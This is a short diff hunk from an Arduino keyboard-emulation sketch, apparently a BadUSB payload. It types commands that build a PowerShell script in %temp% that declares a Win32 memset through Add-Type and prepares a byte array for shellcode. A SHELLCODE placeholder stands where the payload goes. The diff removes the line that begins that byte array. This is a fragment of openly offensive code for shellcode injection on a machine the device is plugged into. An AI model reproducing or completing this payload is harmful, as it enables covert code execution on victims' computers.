@@ -25,7 +25,6 @@ void setup(){
   Keyboard.println("echo public static extern IntPtr memset(IntPtr dest, uint src, uint count); >> %temp%\\ce.ps1");
   Keyboard.println("echo '@ >> %temp%\\ce.ps1");
   Keyboard.println("echo $winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru >> %temp%\\ce.ps1");
-  Keyboard.println("echo [Byte[]]$sc = >> %temp%\\ce.ps1");
 
 
   SHELLCODE
